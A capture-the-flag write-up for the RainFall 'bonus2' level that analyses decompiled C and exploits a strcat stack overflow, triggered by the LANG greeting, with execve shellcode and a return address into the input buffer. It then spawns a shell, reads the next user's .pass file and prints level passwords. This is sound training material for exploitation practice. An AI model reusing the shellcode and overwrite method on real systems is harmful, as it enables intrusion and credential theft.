# **Bonus2**

## **Analysis**

**In `main()` :**

```c
    char    str1[0x28]; // 40
    char    str2[0x20]; // 32
    char    *env;

    // 2 Arguments Needed
    if (argc != 3)
        return 1;

    // 2 strncpy, no overflow possible
    strncpy(str1, av[1], 0x28); // 40
    strncpy(str2, av[2], 0x20); // 32

    // get the env variable 'LANG'
    env = getenv("LANG");

    // Give index from LANG, 0 by default
    if (env != NULL) {
        if (memcmp(env, "fi", 2) == 0) {
            lang = 1;
        } else if (memcmp(env, "nl", 2) == 0) {
            lang = 2;
        }
    }

    // call greetuser
    greetuser(str1);
```

**In `greetuser()`:**

```c
    char str[0x48]; // 72
    
    // Concat the corresponding greeting to the str given
    if (lang == 0)
        strcpy(str, "Hello ");
    else if (lang == 1)
        strcpy(str, "Hyv\xc3\xa4\xc3\xa4 p\xc3\xa4iv\xc3\xa4\xc3\xa4 "); // 18 characters
    else if (lang == 2)
        strcpy(str, "Goedemiddag! "); // 13 characters
    strcat(str, user);

    puts(str);
```

___

## **Exploit**

We cannot overflow with the strncpy, but we can make it so str1 doesn't terminate with '\0' and continue to str2 memory,

So we can have a string of length 72

The str created in `greetuser()` has a max length of 72, so the greeting + our string of string, we can overflow up to 18 characters in this function

```
bonus2@RainFall:~$ export LANG=fi

bonus2@RainFall:~$ gdb bonus2

(gdb) run $(python -c 'print "A" * 40') $(python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz"')
...
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH

Program received signal SIGSEGV, Segmentation fault.
0x46464545 in ?? ()

 ❯ python3 offset.py 45
16
 ❯ python3 offset.py 46
20
```

Offset : 18

```
bonus2@RainFall:~$ export LANG=fi
bonus2@RainFall:~$ ltrace ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18')
...
strncpy(0xbffff690, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 40)                                                                                        = 0xbffff690
...
```

Adress of str1 : 0xbffff690

**Solution:**
 * 1st Argument:
   * (40) first 40 characters of the shell_code
 * 2nd Argument:
   * (05) remaining characters of the shell_code
   * (13) offset = 18 - 5
   * (04) adress of str1, shell_code

```
bonus2@RainFall:~$ export LANG=fi
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/b"') $(python -c 'print "in/sh" + "\x90" * 13 + "\x90\xf6\xff\xbf"')
Hyvää päivää �^�1��F�F
                      �
                       ���V
                            ̀1ۉ�@̀�����/bin/sh�����������������
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

___

*Password: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245*